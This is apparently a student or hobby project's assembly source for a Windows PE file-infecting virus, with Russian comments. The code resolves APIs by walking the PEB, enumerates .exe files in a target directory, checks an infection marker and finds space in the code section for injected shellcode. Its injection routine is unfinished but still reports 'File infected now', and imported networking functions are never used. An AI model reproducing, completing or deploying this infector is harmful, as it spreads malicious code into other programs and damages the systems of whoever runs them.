; jwasm -bin -nologo -Fo virus64.bin /I "C:\wininc\Include" -10p -zf0 -W2 -D_WIN64 virus.asm
; jwasm -bin -nologo -Fo virus32.bin /I "C:\masm32\include" -W2 virus.asm



ifdef _WIN64
CurrentStdcallNotation equ <fastcall>
CurrentCdeclNotation equ <fastcall>
else 
CurrentStdcallNotation equ <stdcall>
CurrentCdeclNotation equ <c>
.486
endif 

option casemap:none
.model flat, CurrentStdcallNotation

include windows.inc

ifdef _WIN64
include WINSOCK2.INC
else
include wsock32.inc
endif

ifdef _WIN64
CLIST_ENTRY typedef LIST_ENTRY64
; машинное слово текущей архитектуры
cword typedef qword
cax equ <rax>
cbx equ <rbx>
ccx equ <rcx>
cdx equ <rdx>
csi equ <rsi>
cdi equ <rdi>
csp equ <rsp>
cbp equ <rbp>
OFFSET_PEB equ <60h>
OFFSET_LDR equ <18h>
OFFSET_INIT_LIST equ <30h>
cur_seg_reg equ <gs>
MANAGER_SIZE equ <24h>
RELOC_TYPE equ <IMAGE_REL_BASED_DIR64>
isize equ <Size_>
else 
CLIST_ENTRY typedef LIST_ENTRY32
; машинное слово текущей архитектуры
cword typedef dword
cax equ <eax>
cbx equ <ebx>
ccx equ <ecx>
cdx equ <edx>
csi equ <esi>
cdi equ <edi>
csp equ <esp>
cbp equ <ebp>
OFFSET_PEB equ <30h>
OFFSET_LDR equ <0Ch>
OFFSET_INIT_LIST equ <1Ch>
cur_seg_reg equ <fs>
MANAGER_SIZE equ <18h>
RELOC_TYPE equ <IMAGE_REL_BASED_HIGHLOW>
endif 

ADDITIONAL_RELOC_TABLE_SIZE equ <(2*sizeof(dword) + 2*sizeof(word))> 		; (c заголовком и ABSOLUTE)
SHELL_TABLE_SIZE equ <(4*sizeof(dword) + 5*sizeof(cword))>
IMAGE_DATA_DIRECTORY_SIZE equ <2*sizeof(dword)>
IMAGE_SECTION_HEADER_SIZE equ <sizeof(IMAGE_SECTION_HEADER)>
DbgBreak   equ int 3

include ..\inc\pe_parser.inc
include ..\inc\proc_work.inc

Stdcall0 typedef proto CurrentStdcallNotation
Stdcall1 typedef proto CurrentStdcallNotation :cword
Stdcall2 typedef proto CurrentStdcallNotation :cword, :cword
Stdcall3 typedef proto CurrentStdcallNotation :cword, :cword, :cword
Stdcall4 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword
Stdcall5 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword
Stdcall6 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword
Stdcall7 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall8 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall9 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
Stdcall10 typedef proto CurrentStdcallNotation :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword, :cword
;StdcallVararg typedef proto CurrentStdcallNotation :vararg
CdeclVararg typedef proto CurrentCdeclNotation :vararg

DefineStdcallVarargProto macro name:req
    sc_&name equ <StdcallVararg ptr [cbx + p_&name]>
endm

DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [cbx + p_&name]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [cbx + p_&name]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        cword offset str_&i
    endm
    name&Count = ($ - name) / sizeof(cword)
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i cword 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm

invoke64 macro args:vararg
ifdef _WIN64
    and csp, 0FFFFFFF0h
endif
    invoke args
endm

HandleRelocs proto CurrentStdcallNotation :cword, :cword
FindCodeSection proto CurrentStdcallNotation :cword
InfectFilesInCurrDir proto CurrentStdcallNotation
Freeze proto CurrentStdcallNotation
InjectCode proto CurrentStdcallNotation :cword, :cword, :cword
ExtendLastSection proto CurrentStdcallNotation :cword, :cword, :cword, :cword


DefineStdcallProto MessageBoxA, 4
DefineStdcallProto VirtualProtect, 4
DefineStdcallProto GetModuleHandleA, 1
DefineStdcallProto WriteProcessMemory, 5
DefineStdcallProto CreateFileA, 7
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1
DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1
DefineStdcallProto GetSystemDirectoryA, 2
DefineStdcallProto GetLastError, 0;;;;;;;
DefineStdcallProto GetTickCount, 0
DefineStdcallProto Sleep, 1

DefineStdcallProto WSAStartup, 2
DefineStdcallProto socket, 3
DefineStdcallProto WSACleanup, 0
DefineStdcallProto WSAGetLastError, 0
DefineStdcallProto connect, 3
DefineStdcallProto send, 4
DefineStdcallProto recv, 4
DefineStdcallProto htons, 1

DefineCProto memset
DefineCProto strlen
DefineCProto printf
DefineCProto memcpy
DefineCProto malloc
DefineCProto strcmp
DefineCProto sprintf
DefineCProto strcpy

sc segment

start:
ifdef _WIN64
    lea cbx, start
    jmp main
else
    call $+5
    pop cbx
    sub cbx, 5
    jmp main
endif

isFirst db 1	; 1 - если дроп первого шеллкода, потом будет везде 0
targetDir db "C:/work/code/virus/test", 0 
originalEP dq 0


;"C:\work\code\virus\test", 0 ;db 260 dup (0)

main proc 

    local   pBase:cword 
    local   pLoadLibraryA:cword
    local   pGetProcAddress:cword
    local 	pVirtualProtect:cword
    local   oldProtect:dword
    local   pExitProcess:cword
    local   hKernelLib:cword

    mov [pBase], cbx

    ; получаем адрес функции GetProcAddress в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_GetProcAddress]
    mov [pGetProcAddress], cax
    ; pGetProcAddress = FindProcAddressByName ("GetProcAddress")

    ; получаем адрес функции LoadLibraryA в kernel32.dll
    invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
    mov [pLoadLibraryA], cax
    ; pLoadLibrary = FindProcAddressByName ("LoadLibraryA")

    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Kernel32]
    mov [hKernelLib], cax
    invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32]
	invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Ws232]
	
    invoke Stdcall2 ptr [pGetProcAddress], [hKernelLib], addr [cbx + str_ExitProcess]
    mov [pExitProcess], cax
    
    invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount

    .if [cbx+isFirst]
        invoke InfectFilesInCurrDir
        invoke Stdcall1 ptr [pExitProcess], 0
    .endif

    invoke FindProcArray, addr [cbx + procNames], addr pVirtualProtect, 1

    ; VirtualProtect (code, CODE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect);
    invoke Stdcall4 ptr [pVirtualProtect], cbx, totalEnd - start, PAGE_EXECUTE_READWRITE, addr oldProtect

    ret
main endp

InjectPeFile proc CurrentStdcallNotation uses cdi cbx pe:cword, code:cword, codeSize:cword

INJ_SIGN_OFFSET equ 079h
INJECTION_SIGN 	equ 050h

    local pVASc:cword
    local pSections:cword
    local pTargetSection:cword

    mov [pVASc], 0

    ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif

    mov cax, [pe]
    mov cax, [cax].PeHeaders.doshead
    add cax, INJ_SIGN_OFFSET
    .if  byte ptr [cax] == INJECTION_SIGN
        invoke sc_printf, addr [cbx + msgErrorAlreadyInfected]
        xor cax, cax
        ret
    .endif
    
    mov cax, [pe]
    mov cax, [cax].PeHeaders.nthead
    lea cax, [cax].IMAGE_NT_HEADERS.FileHeader
    .if [cax].IMAGE_FILE_HEADER.Characteristics & IMAGE_FILE_RELOCS_STRIPPED
        invoke sc_printf, addr [cbx + msgErrorRelocs]
        ret
    .endif    

    ; Находим адрес конца первой кодовой секции
    mov cax, [pe]
    mov cdx, [cax].PeHeaders.sections
    mov [pSections], cdx
    mov ccx, 0
    .while ccx < [cax].PeHeaders.countSec
        ;DbgBreak
        .if ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_CNT_CODE) && \
            ([cdx].IMAGE_SECTION_HEADER.Characteristics & IMAGE_SCN_MEM_EXECUTE)

            mov cax, [cdx].IMAGE_SECTION_HEADER.SizeOfRawData
            add cax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
            mov [pVASc], cax
            .break
        .endif
        ;mov cdx, [pSections]
        lea cdx, [cdx + IMAGE_SECTION_HEADER_SIZE]
        inc ccx
    .endw

    .if [pVASc] == 0
        invoke sc_printf, addr [cbx+msgErrorSpaceNotFound]
        xor cax, cax
        ret
    .endif

    ; сдвигаем все, что ниже

    invoke sc_MessageBoxA, NULL, addr [cbx + msgInfectionSuccess], MB_OK, 0

    ret
InjectPeFile endp

;
; Внедрение в PE-файлы в директории dirName
;
InfectFilesInCurrDir proc CurrentStdcallNotation uses cbx cdi

    local hFindFile:HANDLE
    local findData:WIN32_FIND_DATAA
    local pe:PeHeaders
    local codeSize:cword
    local oldValue:cword
    local dirName[256]:byte
    local nameLen:cword

	ifdef _WIN64
		mov [rbp + 10h], rcx
		mov [rbp + 18h], rdx
		mov [rbp + 20h], r8
		mov [rbp + 28h], r9
	endif
	
    invoke sc_strlen, addr [cbx+targetDir]
    mov [nameLen], cax
    invoke sc_memcpy, addr [dirName], addr [cbx+targetDir], cax
    lea ccx, [dirName]
    add ccx, cword ptr [nameLen]
    invoke sc_memcpy, ccx, addr [cbx + findMask], 7

    invoke sc_FindFirstFileA, addr [dirName], addr findData
	.if cax == -1
		invoke sc_printf, addr [cbx + msgWarningFilesNotFound]
		ret
	.endif
    mov [hFindFile], cax
	
	.while cax != 0
		invoke sc_printf, addr [cbx + strFormat], addr [findData].WIN32_FIND_DATAA.cFileName
		;int 3
		invoke LoadPeFile, addr [findData].WIN32_FIND_DATAA.cFileName , addr [pe], 0
		.if cax == 1
			mov ccx, totalEnd
			sub ccx, start
			mov [codeSize], ccx
			invoke InjectPeFile, addr [pe], addr [cbx + start], [codeSize]
			
			invoke UnloadPeFile, addr [pe]
		.endif
		
		invoke sc_printf, addr [cbx + newLine]
		;invoke Freeze

		invoke sc_FindNextFileA, [hFindFile], addr [findData]   
    .endw

    invoke sc_FindClose, [hFindFile]

    ret
InfectFilesInCurrDir endp


include pe_parser.asm
include proc_work.asm

DefineStr ExitProcess
DefineStr LoadLibraryA
DefineStr GetProcAddress

str_Msvcrt db "msvcrt.dll", 0
str_Kernel32 db "kernel32.dll", 0
str_User32 db "User32.dll", 0
str_Ws232	db "ws2_32.dll", 0


msgHello:
db "virus say hello!", 10,0
newLine:
db 10, 0
strFormatInt:
db "%d", 10, 0
strFormat:
db "%s", 10, 0
findMask:
db "/*.exe", 0
msgErrorConnect:
db "Error: Failed to connect", 10, 0
msgErrorRelocs:
db "Error: Relocs stripped", 10, 0
msgErrorPeLoad:
db "Error: Failed to load this PE file", 10, 0
msgErrorCodeSectionNotFound:
db "Error: Code section not found", 10, 0
msgErrorSpaceNotFound:
db "Error: Space in code section not found", 10, 0
msgErrorAlreadyInfected:
db "Error: File already infected", 10, 0
msgInfectionSuccess:
db "Success: File infected now", 10, 0
msgWarningFilesNotFound:
db "Warning: Exe files for infection not found", 10, 0
msgWarningFileWithoutRelocs:
db "Warning: File without relocs", 10, 0

DefineFuncNamesAndPointers VirtualProtect, MessageBoxA, GetModuleHandleA, WriteProcessMemory, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMappingA, CloseHandle,  MapViewOfFile, UnmapViewOfFile, GetLastError, GetTickCount, Sleep, WSAStartup, WSACleanup, listen, bind, recv, accept, send, socket, htons, connect, printf, memset, strlen, memcpy, malloc, strcmp, sprintf, strcpy, strcat,

totalEnd:

sc ends

end